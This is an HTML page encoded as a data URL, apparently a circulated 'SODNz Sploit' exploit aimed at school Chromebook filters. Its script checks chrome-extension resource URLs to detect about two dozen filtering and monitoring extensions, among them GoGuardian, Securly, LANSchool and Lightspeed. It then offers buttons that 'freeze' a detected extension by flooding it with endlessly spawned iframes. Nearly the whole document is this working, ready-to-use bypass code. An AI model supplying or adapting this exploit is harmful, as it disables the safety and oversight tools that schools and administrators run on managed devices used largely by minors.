data:text/html;base64,<!DOCTYPE html>
<meta payload="sodnzsploitpayloadyouaintblockingthis">
<html>
<head>
    <title>SODNz Sploit</title>
    <style>
        body {
            background-color: #323c53;
            color: #c0c5ce;
            font-family: monospace;
            text-align: center;
        }
        a {
            color: #726d6d;
        }
        dd {
            color: #c0c5ce;
        }
        pre {
            line-height: 14px;
            word-spacing: 0;
            letter-spacing: 0;
        }
        h1 {
            font-size: 32px;
        }
        h5 {
            color: #9e9fa1;
        }
        button {
            background-color: #3f4c5c;
            color: #ffff;
            padding: 4px;
            padding-left: 8px;
            padding-right: 8px;
            border: transparent;
            font-size: 15px;
        }
    </style>
</head>
<body>
    <br><pre>
The key's randomart image is:

+---[RSA 3072]----+
|o*oo+.=   =+.    |
|Eo+* B   o +.    |
|..B.+   o *.     |
|.. +     =.o     |
|o .   . S..      |
| o   . ...o      |
|..  .    *.      |
|....    ooo      |
|.....   .oo.     |
+----[SHA-256]----+

WITH GREAT POWER COMES GREAT RESPONSIBILITY, STAY SAFE MY FRIEND.
<h5>SODNz Sploit, LTMEAT 115+ Refined payload, more extension support added.</h5>
    </pre>
    <button id="buttons_container"><dd><b>Execute Bypass</b></dd></button>
    <script>
        let from_id = a => document.getElementById(a);
    
        let extensions = {
            "securly_new": {
                name: "Securly",
                url: "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css"
            },
            "securly_old": {
                name: "Securly (old)",
                url: "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css"
            },
            "goguardian": {
                name: "Goguardian",
                url: "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js"
            },
            "lanschool": {
                name: "LANSchool",
                url: "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html"
            },
            "linewize": {
                name: "Linewize",
                url: "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html"
            },
            "blocksi": {
                name: "Blocksi",
                url: "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html"
            },
            "fortiguard": {
                name: "Fortiguard",
                url: "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js"
            },
            "cisco": {
                name: "Cisco Umbrella",
                url: "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html"
            },
            "contentkeeper": {
                name: "ContentKeeper",
                url: "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png"
            },
            "securlyclassroom": {
                name: "Securly Classroom",
                url: "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html"
            },
            "hapara": {
                name: "Hapara",
                url: "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html"
            },
            "iboss": {
                name: "iboss",
                url: "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html"
            },
            "lighspeed": {
                name: "Lightspeed",
                url: "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png"
            },
            "lightspeedfilteragent": {
              name: "Lightspeed Filter Agent",
              url: "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png"
            },
            "lightspeedclassroom": {
              name: "Lightspeed Classroom",
              url: "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png"
            },
            "interclass": {
                name: "InterCLASS Filtering Service",
                url: "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html"
            },
            "intersafe": {
                name: "InterSafe GatewayConnection Agent",
                url: "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js"
            },
            "gopher_buddy": {
                name: "Gopher Buddy",
                url: "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png"
            },
            "lanschool_helper": {
                name: "LanSchool Web Helper",
                url: "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html"
            },
            "imtlazarus": {
                name: "IMTLazarus",
                url: "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json"
            },
            "mobile_guardian": {
                name: "Mobile Guardian",
                url: "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html"
            },
            "hapara_admin": {
                name: "Hapara",
                url: "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html"
            },
            "contentkeeperg3": {
            name: "CK-Authenticator G3",
            url: "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png"
            },
            "impero_backdrop": {
              name: "Impero Backdrop",
              url: "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html"
            }, // add nettop vision later
        };
    
        async function check_url(a) {
            let b = new AbortController();
            let c = setTimeout(() => b.abort(), 500);
            try {
                await fetch(a, { signal: b.signal });
                return true;
            } catch (d) {
                let e = d + "";
                return e.includes("AbortError");
            }
        }
    
        async function detect_extensions() {
            let a = [];
            for (let b of Object.values(extensions)) {
                let c = await check_url(b.url);
                if (c) {
                    a.push(b);
                }
            }
            return a;
        }
    
        async function main() {
            let a = await detect_extensions();
            let b = from_id("buttons_container");
            if (!window.chrome) {
                b.innerHTML = "<p><b>Error: You are not running a Chromium-based browser.</b></p>";
                return;
            } else if (a.length === 0) {
                b.innerHTML = "<p><b>Error: No supported extensions detected.</b></p>";
                b.innerHTML += "<p style=\"margin-top: -16px;\">If you want support for a specific extension added, please contact <, and provide the name of the extension in the chrome webstore.</p>";
                return;
            } else {
                b.innerHTML = "";
            }
            for (let c of a) {
                let d = document.createElement("button");
                d.innerText = "Freeze " + c.name;
                d.onclick = () => { create_iframes(c.url); };
                b.append(d);
            }
        }
    
        function create_iframes(a) {
            let b = [];
            let c = 5;
            while (true) {
                let d = document.createElement("iframe");
                document.body.append(d);
                b.push(d);
                let e = Math.max(2, 200 - c);
                for (let f = 0; f < 50; f++) {
                    let g = document.createElement("iframe");
                    g.src = a;
                    g.style.width = g.style.height = "1px";
                    d.contentDocument.body.append(g);
                }
                while (b.length > Math.max(3, 10 - c)) {
                    b[0].remove();
                    b.shift();
                }
                c++;
            }
        }
    
        window.onload = main;
    </script>    
    </body>
</html>
